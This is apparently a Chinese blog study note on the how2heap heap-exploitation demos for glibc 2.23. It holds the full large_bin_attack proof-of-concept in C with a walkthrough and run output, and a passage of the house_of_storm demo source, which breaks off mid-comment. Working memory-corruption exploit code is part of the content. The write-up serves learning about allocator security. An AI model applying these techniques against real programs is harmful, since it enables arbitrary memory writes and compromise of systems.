<h3 id="large-bin-attack（跟-unsorted-bin-attack-实现的功能差不多）"><a href="#large-bin-attack（跟-unsorted-bin-attack-实现的功能差不多）" class="headerlink" title="large_bin_attack（跟 unsorted bin attack 实现的功能差不多）"></a>large_bin_attack（跟 unsorted bin attack 实现的功能差不多）</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">{</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"This file demonstrates large bin attack by writing a large unsigned long value into stack\n"</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"In practice, large bin attack is generally prepared for further attacks, such as rewriting the "</span></span><br><span class="line">           <span class="string">"global variable global_max_fast in libc for further fastbin attack\n\n"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> stack_var1 = <span class="number">0</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> stack_var2 = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Let's first look at the targets we want to rewrite on stack:\n"</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"stack_var1 (%p): %ld\n"</span>, &amp;stack_var1, stack_var1);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"stack_var2 (%p): %ld\n\n"</span>, &amp;stack_var2, stack_var2);</span><br><span class="line"></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> *p1 = <span class="built_in">malloc</span>(<span class="number">0x420</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Now, we allocate the first large chunk on the heap at: %p\n"</span>, p1 - <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"And allocate another fastbin chunk in order to avoid consolidating the next large chunk with"</span></span><br><span class="line">           <span class="string">" the first large chunk during the free()\n\n"</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> *p2 = <span class="built_in">malloc</span>(<span class="number">0x500</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Then, we allocate the second large chunk on the heap at: %p\n"</span>, p2 - <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"And allocate another fastbin chunk in order to avoid consolidating the next large chunk with"</span></span><br><span class="line">           <span class="string">" the second large chunk during the free()\n\n"</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> *p3 = <span class="built_in">malloc</span>(<span class="number">0x500</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Finally, we allocate the third large chunk on the heap at: %p\n"</span>, p3 - <span class="number">2</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"And allocate another fastbin chunk in order to avoid consolidating the top chunk with"</span></span><br><span class="line">           <span class="string">" the third large chunk during the free()\n\n"</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">free</span>(p1);</span><br><span class="line">    <span class="built_in">free</span>(p2);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"We free the first and second large chunks now and they will be inserted in the unsorted bin:"</span></span><br><span class="line">           <span class="string">" [ %p &lt;--&gt; %p ]\n\n"</span>, (<span class="type">void</span> *)(p2 - <span class="number">2</span>), (<span class="type">void</span> *)(p2[<span class="number">0</span>]));</span><br><span class="line"></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Now, we allocate a chunk with a size smaller than the freed first large chunk. This will move the"</span></span><br><span class="line">            <span class="string">" freed second large chunk into the large bin freelist, use parts of the freed first large chunk for allocation"</span></span><br><span class="line">            <span class="string">", and reinsert the remaining of the freed first large chunk into the unsorted bin:"</span></span><br><span class="line">            <span class="string">" [ %p ]\n\n"</span>, (<span class="type">void</span> *)((<span class="type">char</span> *)p1 + <span class="number">0x90</span>));</span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(p3);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Now, we free the third large chunk and it will be inserted in the unsorted bin:"</span></span><br><span class="line">           <span class="string">" [ %p &lt;--&gt; %p ]\n\n"</span>, (<span class="type">void</span> *)(p3 - <span class="number">2</span>), (<span class="type">void</span> *)(p3[<span class="number">0</span>]));</span><br><span class="line"> </span><br><span class="line">    <span class="comment">//------------VULNERABILITY-----------</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Now emulating a vulnerability that can overwrite the freed second large chunk's \"size\""</span></span><br><span class="line">            <span class="string">" as well as its \"bk\" and \"bk_nextsize\" pointers\n"</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Basically, we decrease the size of the freed second large chunk to force malloc to insert the freed third large chunk"</span></span><br><span class="line">            <span class="string">" at the head of the large bin freelist. To overwrite the stack variables, we set \"bk\" to 16 bytes before stack_var1 and"</span></span><br><span class="line">            <span class="string">" \"bk_nextsize\" to 32 bytes before stack_var2\n\n"</span>);</span><br><span class="line"></span><br><span class="line">    p2[<span class="number">-1</span>] = <span class="number">0x3f1</span>;</span><br><span class="line">    p2[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">    p2[<span class="number">2</span>] = <span class="number">0</span>;</span><br><span class="line">    p2[<span class="number">1</span>] = (<span class="type">unsigned</span> <span class="type">long</span>)(&amp;stack_var1 - <span class="number">2</span>);</span><br><span class="line">    p2[<span class="number">3</span>] = (<span class="type">unsigned</span> <span class="type">long</span>)(&amp;stack_var2 - <span class="number">4</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//------------------------------------</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Let's malloc again, so the freed third large chunk being inserted into the large bin freelist."</span></span><br><span class="line">            <span class="string">" During this time, targets should have already been rewritten:\n"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"stack_var1 (%p): %p\n"</span>, &amp;stack_var1, (<span class="type">void</span> *)stack_var1);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"stack_var2 (%p): %p\n"</span>, &amp;stack_var2, (<span class="type">void</span> *)stack_var2);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// sanity check</span></span><br><span class="line">    assert(stack_var1 != <span class="number">0</span>);</span><br><span class="line">    assert(stack_var2 != <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<p>最后的实现结果和unsortedbin差不多，将一个地址的值改成很大的数</p>
<p>首先创建了两个栈上变量（下图的1和2标反了。。）</p>
<p><img src="/2022/03/12/how2heap%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/glibc_2.23/45.png"></p>
<p>接下来创建了p1(0x420), p2(0x500), p3(0x500)，每个p中间都放了一个0x20，这个0x20的作用是为了防止合并</p>
<p><img src="/2022/03/12/how2heap%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/glibc_2.23/46.png"></p>
<p>释放p1和p2</p>
<p><img src="/2022/03/12/how2heap%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/glibc_2.23/47.png"></p>
<p>创建了一个0x90大小的堆块，这里记为p4，创建了0x90大小的堆块会将p1给分割，p1剩余的还是进入unsortedbin，p2因为大小在large bin范围内所以会进入large bin。</p>
<p><img src="/2022/03/12/how2heap%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/glibc_2.23/48.png"></p>
<p>接下来释放p3，p3会进入unsorted bin中</p>
<p><img src="/2022/03/12/how2heap%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/glibc_2.23/49.png"></p>
<p>现在假设有一个漏洞可以改p2的size bk bknext_size，bk指向的是它的后一个被释放chunk的头指针，bk_nextsize指向后一个与当前chunk大小不同的第一个空闲块的头指针</p>
<p><img src="/2022/03/12/how2heap%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/glibc_2.23/50.png"></p>
<p>此时p2的bk = stack_var1 - 0x10，bknext_size为stack_var2 - 0x20，再次创建一个0x90大小的堆。</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">P3-&gt;fd_nextsize = P2;  //P3的fd_nextsize要修改成P2的头指针</span><br><span class="line">P3-&gt;bk_nextsize = P2-&gt;bk_nextsize; //P3的bk_nextsize要修改成P2的bk_nextsize指向的地址</span><br><span class="line">P2-&gt;bk_nextsize = P3;  //P2的bk_nextsize要修改成P3的头指针</span><br><span class="line">P3-&gt;bk_nextsize-&gt;fd_nextsize = P3; //P3的bk_nextsize所指向的堆块的fd_nextsize要修改成P3的头指针</span><br></pre></td></tr></tbody></table></figure>

<p>最后stack_var1和stack_var2的值已经变成了p3的头指针</p>
<p><img src="/2022/03/12/how2heap%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/glibc_2.23/51.png"></p>
<p>运行结果</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">This file demonstrates large bin attack by writing a large unsigned long value into stack</span><br><span class="line">In practice, large bin attack is generally prepared for further attacks, such as rewriting the global variable global_max_fast in libc for further fastbin attack</span><br><span class="line"></span><br><span class="line">Let's first look at the targets we want to rewrite on stack:</span><br><span class="line">stack_var1 (0x7fffffffdd30): 0</span><br><span class="line">stack_var2 (0x7fffffffdd28): 0</span><br><span class="line"></span><br><span class="line">Now, we allocate the first large chunk on the heap at: 0x55555555c000</span><br><span class="line">And allocate another fastbin chunk in order to avoid consolidating the next large chunk with the first large chunk during the free()</span><br><span class="line"></span><br><span class="line">Then, we allocate the second large chunk on the heap at: 0x55555555c460</span><br><span class="line">And allocate another fastbin chunk in order to avoid consolidating the next large chunk with the second large chunk during the free()</span><br><span class="line"></span><br><span class="line">Finally, we allocate the third large chunk on the heap at: 0x55555555c9a0</span><br><span class="line">And allocate another fastbin chunk in order to avoid consolidating the top chunk with the third large chunk during the free()</span><br><span class="line"></span><br><span class="line">We free the first and second large chunks now and they will be inserted in the unsorted bin: [ 0x55555555c460 &lt;--&gt; 0x55555555c000 ]</span><br><span class="line"></span><br><span class="line">Now, we allocate a chunk with a size smaller than the freed first large chunk. This will move the freed second large chunk into the large bin freelist, use parts of the freed first large chunk for allocation, and reinsert the remaining of the freed first large chunk into the unsorted bin: [ 0x55555555c0a0 ]</span><br><span class="line"></span><br><span class="line">Now, we free the third large chunk and it will be inserted in the unsorted bin: [ 0x55555555c9a0 &lt;--&gt; 0x55555555c0a0 ]</span><br><span class="line"></span><br><span class="line">Now emulating a vulnerability that can overwrite the freed second large chunk's "size" as well as its "bk" and "bk_nextsize" pointers</span><br><span class="line">Basically, we decrease the size of the freed second large chunk to force malloc to insert the freed third large chunk at the head of the large bin freelist. To overwrite the stack variables, we set "bk" to 16 bytes before stack_var1 and "bk_nextsize" to 32 bytes before stack_var2</span><br><span class="line"></span><br><span class="line">Let's malloc again, so the freed third large chunk being inserted into the large bin freelist. During this time, targets should have already been rewritten:</span><br><span class="line">stack_var1 (0x7fffffffdd30): 0x55555555c9a0</span><br><span class="line">stack_var2 (0x7fffffffdd28): 0x55555555c9a0</span><br></pre></td></tr></tbody></table></figure>

<h3 id="house-of-storm-unsorted-bin-attack-large-bin-attack"><a href="#house-of-storm-unsorted-bin-attack-large-bin-attack" class="headerlink" title="house_of_storm(unsorted bin attack + large bin attack)"></a>house_of_storm(unsorted bin attack + large bin attack)</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span> filler[<span class="number">0x10</span>];</span><br><span class="line"><span class="type">char</span> target[<span class="number">0x60</span>]; </span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">init</span><span class="params">()</span>{</span><br><span class="line">        setvbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">        setvbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">        <span class="comment">// clearenv();</span></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">// Get the AMOUNT to shift over for size and the offset on the largebin.</span></span><br><span class="line"><span class="comment">// Needs to be a valid minimum sized chunk in order to work.</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">get_shift_amount</span><span class="params">(<span class="type">char</span>* pointer)</span>{</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> shift_amount = <span class="number">0</span>;</span><br><span class="line">        <span class="type">long</span> <span class="type">long</span> ptr = (<span class="type">long</span> <span class="type">long</span>)pointer;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>(ptr &gt; <span class="number">0x20</span>){</span><br><span class="line">                ptr = ptr &gt;&gt; <span class="number">8</span>;</span><br><span class="line">                shift_amount += <span class="number">1</span>;</span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> shift_amount - <span class="number">1</span>; <span class="comment">// Want amount PRIOR to this being zeroed out</span></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>{</span><br><span class="line"></span><br><span class="line">	init();</span><br><span class="line"></span><br><span class="line">	<span class="type">char</span> *unsorted_bin, *large_bin, *fake_chunk, *ptr;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">"House of Storm"</span>); </span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">"======================================"</span>); </span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">"Preparing chunks for the exploit"</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">"Put one chunk into unsorted bin and the other into the large bin"</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">"The unsorted bin chunk MUST be larger than the large bin chunk."</span>);</span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	Putting a chunk into the unsorted bin and another</span></span><br><span class="line"><span class="comment">	into the large bin.</span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line">	unsorted_bin = <span class="built_in">malloc</span> ( <span class="number">0x4e8</span> );  <span class="comment">// size 0x4f0 </span></span><br><span class="line"></span><br><span class="line">	<span class="comment">// prevent merging </span></span><br><span class="line">	<span class="built_in">malloc</span> ( <span class="number">0x18</span> ); </span><br><span class="line"></span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">"Find the proper chunk size to allocate."</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">"Must be exactly the size of the written chunk from above."</span>);</span><br><span class="line">	<span class="comment">/* </span></span><br><span class="line"><span class="comment">	Find the proper size to allocate</span></span><br><span class="line"><span class="comment">	We are using the first 'X' bytes of the heap to act </span></span><br><span class="line"><span class="comment">	as the 'size' of a chunk. Then, we need to allocate a </span></span><br><span class="line"><span class="comment">	chunk exactly this size for the attack to work. </span></span><br><span class="line"><span class="comment">	So, in order to do this, we have to take the higher</span></span><br><span class="line"><span class="comment">	bits of the heap address and allocate a chunk of this</span></span><br><span class="line"><span class="comment">	size, which comes from the upper bytes of the heap address.</span></span><br><span class="line"><span class="comment">	<span class="doctag">NOTE:</span> </span></span><br><span class="line"><span class="comment">	- This does have a 1/2 chance of failing. If the 4th bit </span></span><br><span class="line"><span class="comment">	of this value is set, then the size comparison will fail.</span></span><br><span class="line"><span class="comment">	- Without this calculation, this COULD be brute forced.</span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line">	<span class="type">int</span> shift_amount = get_shift_amount(unsorted_bin);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Shift Amount: %d\n"</span>, shift_amount);</span><br><span class="line"></span><br><span class="line">        <span class="type">size_t</span> alloc_size = ((<span class="type">size_t</span>)unsorted_bin) &gt;&gt; (<span class="number">8</span> * shift_amount);</span><br><span class="line">        <span class="keyword">if</span>(alloc_size &lt; <span class="number">0x10</span>){</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"Chunk Size: 0x%lx\n"</span>, alloc_size);</span><br><span class="line">                <span class="built_in">puts</span>(<span class="string">"Chunk size is too small"</span>);</span><br><span class="line">                <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">        }</span><br><span class="line">        alloc_size = (alloc_size &amp; <span class="number">0xFFFFFFFFE</span>) - <span class="number">0x10</span>; <span class="comment">// Remove the size bits</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"In this case, the chunk size is 0x%lx\n"</span>, alloc_size);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="comment">// Checks to see if the program will crash or not</span></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">        The fourth bit of the size and the 'non-main arena' chunk can NOT be set. Otherwise, the chunk. So, we MUST check for this first. </span></span><br><span class="line"><span class="comment">        Additionally, the code at https://elixir.bootlin.com/glibc/glibc-2.27/source/malloc/malloc.c#L3438</span></span><br><span class="line"><span class="comment">        validates to see if ONE of the following cases is true: </span></span><br><span class="line"><span class="comment">        - av == arena_for_chunk (mem2chunk (mem))</span></span><br><span class="line"><span class="comment">        - chunk is mmaped</span></span><br><span class="line"><span class="comment">        If the 'non-main arena' bit is set on the chunk, then the </span></span><br><span class="line"><span class="comment">        first case will fail. </span></span><br><span class="line"><span class="comment">        If the mmap bit is set, then this will pass. </span></span><br><span class="line"><span class="comment">        </span></span><br><span class="line"><span class="comment">        So, either the arenas need to match up (our fake chunk is in the </span></span><br><span class="line"><span class="comment">        .bss section for this demo. So, clearly, this will not happen) OR</span></span><br><span class="line"><span class="comment">        the mmap bit must be set.</span></span><br><span class="line"><span class="comment">        The logic below validates that the fourth bit of the size</span></span><br><span class="line"><span class="comment">        is NOT set and that either the mmap bit is set or the non-main </span></span><br><span class="line"><span class="comment">        arena bit is NOT set. If this is the case, the exploit should work.</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">        <span class="keyword">if</span>((alloc_size &amp; <span class="number">0x8</span>) != <span class="number">0</span> || (((alloc_size &amp; <span class="number">0x4</span>) == <span class="number">0x4</span>) &amp;&amp; ((alloc_size &amp; <span class="number">0x2</span>) != <span class="number">0x2</span>))){</span><br><span class="line">                <span class="built_in">puts</span>(<span class="string">"Allocation size has bit 4 of the size set or "</span>);</span><br><span class="line">                <span class="built_in">puts</span>(<span class="string">"mmap and non-main arena bit check will fail"</span>);</span><br><span class="line">                <span class="built_in">puts</span>(<span class="string">"Please try again! :)"</span>);</span><br><span class="line">                <span class="built_in">puts</span>(<span class="string">"Exiting..."</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">	}</span><br><span class="line"></span><br><span class="line">	large_bin  =  <span class="built_in">malloc</span> ( <span class="number">0x4d8</span> );  <span class="comment">// size 0x4e0 </span></span><br><span class="line">	<span class="comment">// prevent merging </span></span><br><span class="line">	<span class="built_in">malloc</span> ( <span class="number">0x18</span> );</span><br><span class="line"></span><br><span class="line">	<span class="comment">// FIFO </span></span><br><span class="line">	<span class="built_in">free</span> ( large_bin );  <span class="comment">// put small chunks first </span></span><br><span class="line">	<span class="built_in">free</span> ( unsorted_bin );</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Put the 'large bin' chunk into the large bin</span></span><br><span class="line">	unsorted_bin = <span class="built_in">malloc</span>(<span class="number">0x4e8</span>);</span><br><span class="line">	<span class="built_in">free</span>(unsorted_bin);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	At this point, there is a single chunk in the </span></span><br><span class="line"><span class="comment">	large bin and a single chunk in the unsorted bin. </span></span><br><span class="line"><span class="comment">	It should be noted that the unsorted bin chunk </span></span><br><span class="line"><span class="comment">	should be LARGER in size than the large bin chunk</span></span><br><span class="line"><span class="comment">	but should still be within the same bin.</span></span><br><span class="line"><span class="comment">	In this setup, the large_bin has a chunk</span></span><br><span class="line"><span class="comment">	of size 0x4e0 and the unsorted bin </span></span><br><span class="line"><span class="comment">	has a chunk of size 0x4f0. This technique relies on</span></span><br><span class="line"><span class="comment">	the unsorted bin chunk being added to the same bin</span></span><br><span class="line"><span class="comment">	but a 